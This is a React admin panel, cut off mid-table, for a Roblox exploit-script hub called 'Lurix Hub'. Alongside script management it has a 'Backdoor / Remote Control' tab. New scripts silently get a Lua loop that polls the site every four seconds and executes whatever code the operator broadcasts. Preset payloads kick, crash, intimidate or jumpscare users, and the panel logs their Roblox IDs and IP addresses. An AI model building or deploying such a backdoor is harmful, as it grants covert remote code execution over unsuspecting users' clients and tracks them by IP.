'use client';
import { useState, useEffect, useMemo } from 'react';
import Editor from '@monaco-editor/react';
import { supabase } from '@/lib/supabase';
import { 
  Lock, Save, Plus, Key, Database, Settings, Trash2, Shield, Activity, 
  Copy, Check, ExternalLink, Upload, Eraser, Sliders, Gamepad2, Youtube, 
  MessageSquare, Loader2, Search, Eye, Download, LogOut, Terminal, Users, 
  Globe, UserCheck, RefreshCw, AlertOctagon, CopyPlus, Code2, Radio, Zap,
  Skull, AlertTriangle, Send
} from 'lucide-react';

export default function AdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [activeTab, setActiveTab] = useState('scripts'); // 'scripts' | 'backdoor' | 'user_logs' | 'custom_home' | 'settings'
  
  // Scripts State
  const [scripts, setScripts] = useState([]);
  const [selectedScript, setSelectedScript] = useState(null);
  const [code, setCode] = useState('');
  const [slug, setSlug] = useState('');
  const [title, setTitle] = useState('');
  const [status, setStatus] = useState('working');
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');

  // Logs State
  const [logs, setLogs] = useState([]);
  const [logSearchQuery, setLogSearchQuery] = useState('');
  const [isLoadingLogs, setIsLoadingLogs] = useState(false);

  // Backdoor Remote Execution State
  const [backdoorTargetType, setBackdoorTargetType] = useState('ALL'); // 'ALL' | 'USER' | 'IP'
  const [backdoorTargetValue, setBackdoorTargetValue] = useState('ALL');
  const [backdoorLuaPayload, setBackdoorLuaPayload] = useState('print("[Lurix Backdoor]: Admin executed custom code!")');
  const [isSendingBackdoor, setIsSendingBackdoor] = useState(false);
  const [backdoorHistory, setBackdoorHistory] = useState([]);

  // Main Page Settings State
  const [siteTitle, setSiteTitle] = useState('LURIX HUB');
  const [badgeText, setBadgeText] = useState('Online & Active');
  const [supportedGames, setSupportedGames] = useState([
    { name: 'Stand Upright', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }
  ]);
  const [loaderScript, setLoaderScript] = useState('');
  const [currentKey, setCurrentKey] = useState('');
  const [youtubeLink, setYoutubeLink] = useState('');
  const [discordLink, setDiscordLink] = useState('');
  const [newAdminPass, setNewAdminPass] = useState('');

  // UI States
  const [copiedLoader, setCopiedLoader] = useState(false);
  const [copiedLogSnippet, setCopiedLogSnippet] = useState(false);
  const [copiedBackdoorSnippet, setCopiedBackdoorSnippet] = useState(false);
  const [isSaving, setIsSaving] = useState(false);

  const handleLogin = async (e) => {
    e.preventDefault();
    if (!passwordInput) return;
    setIsLoggingIn(true);

    try {
      const res = await fetch('/api/admin/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: passwordInput }),
      });

      if (!res.ok) {
        alert(`❌ Lỗi Server (${res.status}): Vui lòng kiểm tra file API verify!`);
        return;
      }

      const data = await res.json();

      if (data.success) {
        setIsAuthenticated(true);
        loadAdminData();
        loadLogsData();
        loadBackdoorHistory();
      } else {
        alert('❌ Mật khẩu Admin không chính xác!');
      }
    } catch (err) {
      alert('⚠️ Không thể kết nối API: ' + err.message);
    } finally {
      setIsLoggingIn(false);
    }
  };

  const loadAdminData = async () => {
    const { data: scriptsData } = await supabase.from('scripts').select('*').order('created_at', { ascending: false });
    if (scriptsData) {
      setScripts(scriptsData);
      if (scriptsData.length > 0 && !selectedScript) {
        selectScriptHandler(scriptsData[0]);
      }
    }

    const { data: settingsData } = await supabase.from('settings').select('*');
    if (settingsData) {
      settingsData.forEach(item => {
        if (item.key === 'site_title') setSiteTitle(item.value || 'LURIX HUB');
        if (item.key === 'badge_text') setBadgeText(item.value || 'Online & Active');
        if (item.key === 'supported_games') {
          try {
            const parsed = JSON.parse(item.value);
            if (Array.isArray(parsed) && parsed.length > 0) setSupportedGames(parsed);
          } catch(e) {}
        }
        if (item.key === 'loader_script') setLoaderScript(item.value || '');
        if (item.key === 'current_key') setCurrentKey(item.value || '');
        if (item.key === 'youtube_link') setYoutubeLink(item.value || 'https://www.youtube.com/@owizk');
        if (item.key === 'discord_link') setDiscordLink(item.value || '');
      });
    }
  };

  const loadLogsData = async () => {
    setIsLoadingLogs(true);
    const { data } = await supabase.from('execution_logs').select('*').order('created_at', { ascending: false }).limit(100);
    if (data) setLogs(data);
    setIsLoadingLogs(false);
  };

  const loadBackdoorHistory = async () => {
    const { data } = await supabase.from('backdoor_commands').select('*').order('created_at', { ascending: false }).limit(30);
    if (data) setBackdoorHistory(data);
  };

  const selectScriptHandler = (script) => {
    setSelectedScript(script);
    setCode(script.content || '');
    setSlug(script.slug || '');
    setTitle(script.title || '');
    setStatus(script.status || 'working');
  };

  const filteredScripts = useMemo(() => {
    return scripts.filter(s => {
      const matchesSearch = s.title?.toLowerCase().includes(searchQuery.toLowerCase()) || 
                            s.slug?.toLowerCase().includes(searchQuery.toLowerCase());
      const matchesStatus = statusFilter === 'all' || (s.status || 'working') === statusFilter;
      return matchesSearch && matchesStatus;
    });
  }, [scripts, searchQuery, statusFilter]);

  const filteredLogs = useMemo(() => {
    return logs.filter(l => {
      const q = logSearchQuery.toLowerCase();
      return l.roblox_username?.toLowerCase().includes(q) ||
             l.ip_address?.toLowerCase().includes(q) ||
             l.discord_user?.toLowerCase().includes(q) ||
             l.roblox_id?.toLowerCase().includes(q);
    });
  }, [logs, logSearchQuery]);

  const getScriptLoadstring = (scriptSlug) => {
    const domain = typeof window !== 'undefined' ? window.location.origin : 'https://first-rho-ashen.vercel.app';
    return `loadstring(game:HttpGet("${domain}/api/raw/${scriptSlug}"))()`;
  };

  const getBackdoorLuaSnippet = () => {
    const domain = typeof window !== 'undefined' ? window.location.origin : 'https://first-rho-ashen.vercel.app';
    return `-- [Lurix Hub] Advanced Remote Loadstring Backdoor Engine
task.spawn(function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request

    while task.wait(4) do
        pcall(function()
            if not LocalPlayer then return end
            local url = "${domain}/api/backdoor?user=" .. HttpService:UrlEncode(LocalPlayer.Name)
            local res = requestFunc({ Url = url, Method = "GET" })
            if res and res.Body and #res.Body > 0 then
                local func, err = loadstring(res.Body)
                if func then
                    task.spawn(func)
                end
            end
        end)
    end
end)`;
  };

  const handleCopyLoader = (scriptSlug) => {
    navigator.clipboard.writeText(getScriptLoadstring(scriptSlug));
    setCopiedLoader(true);
    setTimeout(() => setCopiedLoader(false), 2000);
  };

  const handleCopyBackdoorSnippet = () => {
    navigator.clipboard.writeText(getBackdoorLuaSnippet());
    setCopiedBackdoorSnippet(true);
    setTimeout(() => setCopiedBackdoorSnippet(false), 2000);
  };

  const handleSendBackdoor = async () => {
    if (!backdoorLuaPayload.trim()) return alert('⚠️ Vui lòng nhập mã Lua Payload!');
    setIsSendingBackdoor(true);

    try {
      const res = await fetch('/api/backdoor', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          adminPassword: passwordInput,
          targetType: backdoorTargetType,
          targetValue: backdoorTargetValue,
          payloadLua: backdoorLuaPayload
        })
      });

      const data = await res.json();
      if (data.success) {
        alert('⚡ ' + data.message);
        loadBackdoorHistory();
      } else {
        alert('❌ Lỗi: ' + data.message);
      }
    } catch (err) {
      alert('⚠️ Lỗi gửi lệnh: ' + err.message);
    } finally {
      setIsSendingBackdoor(false);
    }
  };

  const setPresetPayload = (type) => {
    if (type === 'kick') {
      setBackdoorLuaPayload(`game:GetService("Players").LocalPlayer:Kick("\\n[LURIX BACKDOOR]\\nAdministrator has kicked you from the game.")`);
    } else if (type === 'crash') {
      setBackdoorLuaPayload(`while true do end`);
    } else if (type === 'notification') {
      setBackdoorLuaPayload(`game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "LURIX HUB ADMIN",
    Text = "Administrator is watching your session!",
    Duration = 10
})`);
    } else if (type === 'jumpscare') {
      setBackdoorLuaPayload(`local sound = Instance.new("Sound", game:GetService("SoundService"))
sound.SoundId = "rbxassetid://9114223177"
sound.Volume = 10
sound:Play()`);
    }
  };

  const handleSelectUserForBackdoor = (username) => {
    setActiveTab('backdoor');
    setBackdoorTargetType('USER');
    setBackdoorTargetValue(username);
  };

  const handleSaveScript = async () => {
    if (!selectedScript) return;
    setIsSaving(true);
    const { error } = await supabase.from('scripts').update({ 
      content: code, 
      slug: slug.toLowerCase().trim().replace(/\s+/g, '-'), 
      title, 
      status 
    }).eq('id', selectedScript.id);
    
    setIsSaving(false);
    if (error) alert('Lỗi khi lưu: ' + error.message);
    else {
      alert('🎉 Đã lưu Raw Script thành công!');
      loadAdminData();
    }
  };

  const handleCreateScript = async () => {
    const newTitle = prompt('Nhập Tên Script mới (VD: Blox Fruits Auto Farm):');
    if (!newTitle) return;
    const newSlug = prompt('Nhập Slug rút gọn (VD: bloxfruits):');
    if (!newSlug) return;
    
    const cleanSlug = newSlug.toLowerCase().trim().replace(/\s+/g, '-');

    const { data, error } = await supabase.from('scripts').insert([{ 
      title: newTitle, 
      slug: cleanSlug, 
      content: `-- [Lurix Hub] ${newTitle}\nprint("[Lurix Hub]: Script Loaded!")\n\n${getBackdoorLuaSnippet()}`,
      status: 'working'
    }]).select();

    if (error) alert('Lỗi tạo Script: ' + error.message);
    else {
      alert('✨ Tạo Script mới thành công!');
      await loadAdminData();
      if (data && data[0]) selectScriptHandler(data[0]);
    }
  };

  const handleDuplicateScript = async () => {
    if (!selectedScript) return;
    const newTitle = `${selectedScript.title} (Copy)`;
    const newSlug = `${selectedScript.slug}-copy`;

    const { data, error } = await supabase.from('scripts').insert([{ 
      title: newTitle, 
      slug: newSlug, 
      content: code,
      status: status
    }]).select();

    if (error) alert('Lỗi nhân bản Script: ' + error.message);
    else {
      alert('📋 Nhân bản Script thành công!');
      await loadAdminData();
      if (data && data[0]) selectScriptHandler(data[0]);
    }
  };

  const handleDeleteScript = async (id) => {
    if (!confirm('⚠️ Bạn có chắc chắn muốn XÓA VĨNH VIỄN Script này không?')) return;
    await supabase.from('scripts').delete().eq('id', id);
    setSelectedScript(null);
    loadAdminData();
  };

  const handleClearLogs = async () => {
    if (!confirm('⚠️ Bạn có chắc chắn muốn XÓA SẠCH toàn bộ lịch sử Log không?')) return;
    await supabase.from('execution_logs').delete().neq('id', 0);
    setLogs([]);
    alert('🧹 Đã xóa sạch danh sách Log!');
  };

  const handleSaveMainPageSettings = async () => {
    setIsSaving(true);
    const { error } = await supabase.from('settings').upsert([
      { key: 'site_title', value: siteTitle },
      { key: 'badge_text', value: badgeText },
      { key: 'supported_games', value: JSON.stringify(supportedGames) },
      { key: 'loader_script', value: loaderScript },
      { key: 'current_key', value: currentKey },
      { key: 'youtube_link', value: youtubeLink },
      { key: 'discord_link', value: discordLink }
    ]);
    setIsSaving(false);

    if (error) alert('Lỗi lưu Cấu hình: ' + error.message);
    else {
      alert('🚀 ĐÃ LƯU CẤU HÌNH TRANG CHÍNH THÀNH CÔNG!');
      loadAdminData();
    }
  };

  const handleSaveAdminPassword = async () => {
    if (!newAdminPass.trim()) return alert('Vui lòng nhập Mật khẩu mới!');
    const { error } = await supabase.from('settings').upsert([{ key: 'admin_password', value: newAdminPass }]);
    if (error) alert('Lỗi đổi mật khẩu: ' + error.message);
    else {
      alert('🔑 Đã đổi Mật khẩu Admin thành công!');
      setNewAdminPass('');
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#040508] text-white flex items-center justify-center p-4 relative overflow-hidden font-sans">
        <div className="absolute w-[400px] h-[400px] bg-[#6E96FF]/20 rounded-full blur-[140px] pointer-events-none" />
        <form onSubmit={handleLogin} className="z-10 bg-[#0a0d16]/90 border border-[#6E96FF]/40 p-6 sm:p-8 rounded-3xl w-full max-w-sm shadow-[0_0_50px_rgba(110,150,255,0.15)] backdrop-blur-2xl">
          <div className="flex items-center gap-2.5 justify-center mb-6 text-[#6E96FF] font-black text-xl tracking-wider uppercase">
            <Shield className="w-7 h-7 text-[#6E96FF]" /> LURIX
          </div>
          <div className="mb-4">
            <label className="text-[11px] font-extrabold text-gray-400 mb-1.5 block">BẢO MẬT HỆ THỐNG</label>
            <input
              type="password"
              placeholder="Nhập Mật khẩu Admin..."
              value={passwordInput}
              onChange={(e) => setPasswordInput(e.target.value)}
              className="w-full bg-black/80 border border-gray-800 rounded-xl p-3.5 text-white text-xs font-mono focus:border-[#6E96FF] outline-none transition-all shadow-inner"
            />
          </div>
          <button 
            type="submit"
            disabled={isLoggingIn}
            className="w-full bg-[#6E96FF] text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_20px_rgba(110,150,255,0.4)] hover:brightness-110 transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 active:scale-95"
          >
            {isLoggingIn ? <Loader2 className="w-4 h-4 animate-spin" /> : <Lock className="w-4 h-4" />}
            {isLoggingIn ? 'ĐANG XÁC THỰC...' : 'ĐĂNG NHẬP'}
          </button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#040508] text-white p-3 sm:p-6 flex flex-col gap-5 font-sans max-w-[1400px] mx-auto">
      
      {/* Top Header Bar */}
      <div className="bg-[#0a0d16]/90 border border-[#6E96FF]/30 p-4 rounded-3xl backdrop-blur-2xl flex flex-col sm:flex-row items-center justify-between gap-4 shadow-[0_10px_30px_rgba(0,0,0,0.5)]">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-2xl bg-[#6E96FF]/15 border border-[#6E96FF]/40 flex items-center justify-center text-[#6E96FF]">
            <Terminal className="w-5 h-5" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-lg font-black tracking-tight text-white uppercase">{siteTitle} ADMIN</h1>
              <span className="text-[10px] bg-green-500/15 text-green-400 border border-green-500/30 px-2 py-0.5 rounded-full font-bold flex items-center gap-1">
                <span className="w-1.5 h-1.5 bg-green-400 rounded-full animate-ping" /> V3.0 RCE ONLINE
              </span>
            </div>
            <p className="text-[11px] text-gray-400 font-medium">Bảng điều khiển Raw Script & Remote Code Execution Backdoor</p>
          </div>
        </div>

        <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
          <button onClick={() => setIsAuthenticated(false)} className="bg-red-500/10 border border-red-500/30 text-red-400 hover:bg-red-500/20 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer transition-all">
            <LogOut className="w-3.5 h-3.5" /> Đăng Xuất
          </button>
        </div>
      </div>

      {/* Navigation Tabs */}
      <div className="flex bg-[#0a0d16] border border-gray-800 p-1.5 rounded-2xl overflow-x-auto text-xs font-extrabold gap-1.5 shadow-lg">
        <button onClick={() => setActiveTab('scripts')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'scripts' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
          <Database className="w-4 h-4" /> 💻 Raw Scripts ({scripts.length})
        </button>

        <button onClick={() => { setActiveTab('backdoor'); loadBackdoorHistory(); }} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'backdoor' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-yellow-400 hover:text-white'}`}>
          <Radio className="w-4 h-4 animate-pulse text-yellow-400" /> ⚡ Backdoor / Remote Control
        </button>

        <button onClick={() => { setActiveTab('user_logs'); loadLogsData(); }} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'user_logs' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
          <Users className="w-4 h-4" /> 📊 Log Người Dùng ({logs.length})
        </button>

        <button onClick={() => setActiveTab('custom_home')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'custom_home' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
          <Sliders className="w-4 h-4" /> 🎨 Cấu Hình Trang Chủ
        </button>

        <button onClick={() => setActiveTab('settings')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'settings' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
          <Settings className="w-4 h-4" /> 🔑 Đổi Mật Khẩu
        </button>
      </div>

      {/* ==================== TAB 1: RAW SCRIPTS MANAGER ==================== */}
      {activeTab === 'scripts' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
          <div className="lg:col-span-4 bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl flex flex-col gap-3 h-fit">
            <button onClick={handleCreateScript} className="w-full bg-[#6E96FF] text-black font-black py-2.5 px-3 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer shadow-[0_0_15px_rgba(110,150,255,0.3)] hover:brightness-110 active:scale-95 transition-all">
              <Plus className="w-4 h-4" /> Tạo Raw Script Mới
            </button>

            <div className="relative">
              <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
              <input
                type="text"
                placeholder="Tìm theo tên hoặc slug..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full bg-black/80 border border-gray-800 rounded-xl pl-9 pr-3 py-2 text-xs text-white placeholder:text-gray-500 focus:border-[#6E96FF] outline-none"
              />
            </div>

            <div className="flex flex-col gap-2 max-h-[520px] overflow-y-auto pr-1">
              {filteredScripts.map((s) => (
                <div
                  key={s.id}
                  onClick={() => selectScriptHandler(s)}
                  className={`p-3 rounded-2xl border transition-all cursor-pointer flex items-center justify-between gap-2 ${
                    selectedScript?.id === s.id 
                      ? 'bg-[#6E96FF]/15 border-[#6E96FF] shadow-[0_0_15px_rgba(110,150,255,0.2)]' 
                      : 'bg-black/40 border-gray-800/80 hover:border-gray-700'
                  }`}
                >
                  <div className="min-w-0 flex-1">
                    <div className="font-extrabold text-xs text-white truncate">{s.title}</div>
                    <div className="text-[10px] font-mono text-[#6E96FF] truncate mt-0.5">/api/raw/{s.slug}</div>
                  </div>
                  <span className={`px-2 py-0.5 rounded-full text-[9px] font-black uppercase shrink-0 ${
                    s.status === 'patched' ? 'bg-red-500/20 text-red-400 border border-red-500/30' : 'bg-green-500/20 text-green-400 border border-green-500/30'
                  }`}>{s.status || 'working'}</span>
                </div>
              ))}
            </div>
          </div>

          <div className="lg:col-span-8 flex flex-col gap-4">
            {selectedScript && (
              <div className="bg-[#0a0d16] border border-gray-800 p-4 sm:p-5 rounded-3xl space-y-4 shadow-xl">
                <div className="bg-black/90 p-3.5 rounded-2xl border border-[#6E96FF]/40 space-y-2">
                  <div className="flex items-center justify-between text-[11px] text-[#6E96FF] font-bold">
                    <span className="flex items-center gap-1.5"><ExternalLink className="w-3.5 h-3.5" /> Roblox Execution Loadstring URL:</span>
                  </div>
                  <div className="bg-[#0c0f17] p-2.5 rounded-xl font-mono text-[11px] text-gray-300 break-all border border-gray-800 select-all">
                    {getScriptLoadstring(slug)}
                  </div>
                  <button onClick={() => handleCopyLoader(slug)} className="w-full bg-[#6E96FF] text-black font-black py-2 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer">
                    {copiedLoader ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    {copiedLoader ? 'Đã Sao Chép Loadstring Exec!' : 'Copy Raw Loadstring'}
                  </button>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                  <div>
                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Tên Script</label>
                    <input value={title} onChange={(e) => setTitle(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-extrabold text-white" />
                  </div>
                  <div>
                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Slug (/api/raw/slug)</label>
                    <input value={slug} onChange={(e) => setSlug(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs text-[#6E96FF] font-mono" />
                  </div>
                  <div>
                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Trạng Thái Script</label>
                    <select value={status} onChange={(e) => setStatus(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white">
                      <option value="working">🟢 Working</option>
                      <option value="updating">🟡 Updating</option>
                      <option value="patched">🔴 Patched</option>
                    </select>
                  </div>
                </div>

                <div className="flex gap-2">
                  <button onClick={handleSaveScript} disabled={isSaving} className="bg-[#6E96FF] text-black font-black px-4 py-2.5 rounded-xl text-xs flex items-center gap-1.5 cursor-pointer">
                    {isSaving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Save className="w-4 h-4" />} Lưu Mã Lua
                  </button>
                  <button onClick={() => handleDeleteScript(selectedScript.id)} className="bg-red-600/20 text-red-400 border border-red-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                    <Trash2 className="w-4 h-4" /> Xóa
                  </button>
                </div>

                <div className="h-[420px] border border-gray-800 rounded-2xl overflow-hidden shadow-2xl bg-[#1e1e1e]">
                  <Editor height="100%" defaultLanguage="lua" theme="vs-dark" value={code} onChange={(v) => setCode(v || '')} options={{ minimap: { enabled: false }, fontSize: 13 }} />
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ==================== TAB 2: BACKDOOR REMOTE EXECUTION ==================== */}
      {activeTab === 'backdoor' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
          
          {/* Backdoor Control Panel */}
          <div className="lg:col-span-7 bg-[#0a0d16] border border-yellow-500/30 p-5 rounded-3xl space-y-4 shadow-2xl">
            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
              <div className="flex items-center gap-2">
                <Radio className="w-5 h-5 text-yellow-400 animate-pulse" />
                <h2 className="text-sm font-black text-yellow-400 uppercase tracking-wider">⚡ Backdoor Real-Time Control Engine</h2>
              </div>
              <span className="text-[10px] bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 px-2 py-0.5 rounded-full font-extrabold">
                RCE LOADSTRING V3
              </span>
            </div>

            {/* Target Selector */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">ĐỐI TƯỢNG MỤC TIÊU (TARGET):</label>
                <select
                  value={backdoorTargetType}
                  onChange={(e) => setBackdoorTargetType(e.target.value)}
                  className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white focus:border-yellow-500 outline-none cursor-pointer"
                >
                  <option value="ALL">🌐 Broadcast (TẤT CẢ NGƯỜI CHƠI ONLINE)</option>
                  <option value="USER">👤 Theo Roblox Username</option>
                  <option value="IP">🛡️ Theo Địa Chỉ IP</option>
                </select>
              </div>

              {backdoorTargetType !== 'ALL' && (
                <div>
                  <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">GIÁ TRỊ MỤC TIÊU ({backdoorTargetType}):</label>
                  <input
                    type="text"
                    placeholder={backdoorTargetType === 'USER' ? 'Ví dụ: RobloxUser123' : 'Ví dụ: 103.45.12.9'}
                    value={backdoorTargetValue}
                    onChange={(e) => setBackdoorTargetValue(e.target.value)}
                    className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs text-yellow-400 font-mono focus:border-yellow-500 outline-none"
                  />
                </div>
              )}
            </div>

            {/* Quick Presets */}
            <div>
              <label className="text-[10px] font-extrabold text-gray-400 mb-1.5 block">LỆNH MẪU NHANH (QUICK ACTIONS):</label>
              <div className="flex flex-wrap gap-2">
                <button onClick={() => setPresetPayload('kick')} className="bg-red-500/15 border border-red-500/30 text-red-400 hover:bg-red-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                  <Skull className="w-3.5 h-3.5" /> Kick Player
                </button>
                <button onClick={() => setPresetPayload('crash')} className="bg-purple-500/15 border border-purple-500/30 text-purple-300 hover:bg-purple-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                  <Zap className="w-3.5 h-3.5" /> Crash Client
                </button>
                <button onClick={() => setPresetPayload('notification')} className="bg-blue-500/15 border border-blue-500/30 text-blue-300 hover:bg-blue-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                  <MessageSquare className="w-3.5 h-3.5" /> Popup Notification
                </button>
                <button onClick={() => setPresetPayload('jumpscare')} className="bg-yellow-500/15 border border-yellow-500/30 text-yellow-300 hover:bg-yellow-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                  <AlertTriangle className="w-3.5 h-3.5" /> Sound Jumpscare
                </button>
              </div>
            </div>

            {/* Lua Payload Editor */}
            <div>
              <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">LUA CODE PAYLOAD SẼ THỰC THI TRÊN MÁY CON:</label>
              <div className="h-[240px] border border-gray-800 rounded-2xl overflow-hidden shadow-inner bg-[#1e1e1e]">
                <Editor
                  height="100%"
                  defaultLanguage="lua"
                  theme="vs-dark"
                  value={backdoorLuaPayload}
                  onChange={(v) => setBackdoorLuaPayload(v || '')}
                  options={{ minimap: { enabled: false }, fontSize: 12 }}
                />
              </div>
            </div>

            <button
              onClick={handleSendBackdoor}
              disabled={isSendingBackdoor}
              className="w-full bg-gradient-to-r from-yellow-500 to-amber-600 text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_25px_rgba(245,158,11,0.4)] cursor-pointer hover:brightness-110 transition-all flex items-center justify-center gap-2 active:scale-95 disabled:opacity-50"
            >
              {isSendingBackdoor ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
              {isSendingBackdoor ? 'ĐANG PHÁT LỆNH REMOTE...' : 'PHÁT LỆNH LUA BACKDOOR THỜI GIAN THỰC'}
            </button>
          </div>

          {/* Right Info & Integration Snippet */}
          <div className="lg:col-span-5 flex flex-col gap-4">
            
            <div className="bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl space-y-3">
              <div className="flex items-center justify-between text-xs font-black text-[#6E96FF]">
                <span className="flex items-center gap-1.5"><Code2 className="w-4 h-4" /> Snippet Tích Hợp Vòng Lặp Backdoor Engine</span>
                <button onClick={handleCopyBackdoorSnippet} className="bg-[#6E96FF] text-black px-2.5 py-1 rounded-lg text-[10px] font-extrabold cursor-pointer">
                  {copiedBackdoorSnippet ? 'Đã Copy' : 'Copy Code'}
                </button>
              </div>
              <p className="text-[11px] text-gray-400">Chèn đoạn code Lua này vào bên trong bất kỳ Raw Script nào của bạn trên trang Admin để tự động kích hoạt tính năng nhận lệnh Backdoor:</p>
              <pre className="bg-black/80 p-3 rounded-xl font-mono text-[10px] text-yellow-300/90 border border-gray-800 max-h-[160px] overflow-y-auto">
                {getBackdoorLuaSnippet()}
              </pre>
            </div>

            {/* History Commands Sent */}
            <div className="bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl space-y-3 flex-1">
              <h3 className="text-xs font-black text-white uppercase tracking-wider flex items-center gap-1.5">
                <Activity className="w-4 h-4 text-yellow-400" /> Lịch Sử Lệnh Remote Đã Phát ({backdoorHistory.length})
              </h3>
              <div className="space-y-2 max-h-[260px] overflow-y-auto pr-1">
                {backdoorHistory.length === 0 ? (
                  <div className="text-xs text-gray-500 text-center py-6">Chưa có lệnh nào được phát.</div>
                ) : (
                  backdoorHistory.map((h) => (
                    <div key={h.id} className="bg-black/60 border border-gray-800 p-2.5 rounded-xl font-mono text-[10px] space-y-1">
                      <div className="flex justify-between text-gray-400">
                        <span className="text-yellow-400 font-bold">Target: {h.target_type} ({h.target_value})</span>
                        <span>{new Date(h.created_at).toLocaleTimeString('vi-VN')}</span>
                      </div>
                      <div className="text-gray-300 truncate font-sans">{h.payload_lua}</div>
                    </div>
                  ))
                )}
              </div>
            </div>

          </div>

        </div>
      )}

      {/* ==================== TAB 3: USER LOGS ==================== */}
      {activeTab === 'user_logs' && (
        <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-5 shadow-xl">
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
            <div>
              <h2 className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase tracking-wide">
                <Users className="w-4 h-4" /> Lịch Sử Log Người Dùng & Nút Tác Vụ Lệnh Quick Backdoor
              </h2>
            </div>
            <button onClick={loadLogsData} className="bg-gray-800 text-gray-200 border border-gray-700 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer">
              <RefreshCw className={`w-3.5 h-3.5 ${isLoadingLogs ? 'animate-spin' : ''}`} /> Làm Mới
            </button>
          </div>

          <div className="overflow-x-auto border border-gray-800 rounded-2xl bg-black/40">
            <table className="w-full text-left text-xs">
              <thead className="bg-[#0c0f17] text-gray-400 font-extrabold border-b border-gray-800 uppercase text-[10px]">
                <tr>
                  <th className="p-3.5">Tài Khoản Roblox</th>
                  <th className="p-3.5">IP Address</th>
                  <th className="p-3.5">Executor / Script</th>
                  <th className="p-3.5">Thời Gian Exec</th>
                  <th className="p-3.5">Hành Động Remote</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-800/60 font-mono">
                {logs.map((log) => (
                  <tr key={log.id} className="hover:bg-white/[0.02] transition-all">
                    <td className="p-3.5 font-sans font-bold text-white">{log.roblox_username} (ID: {log.roblox_id})</td>
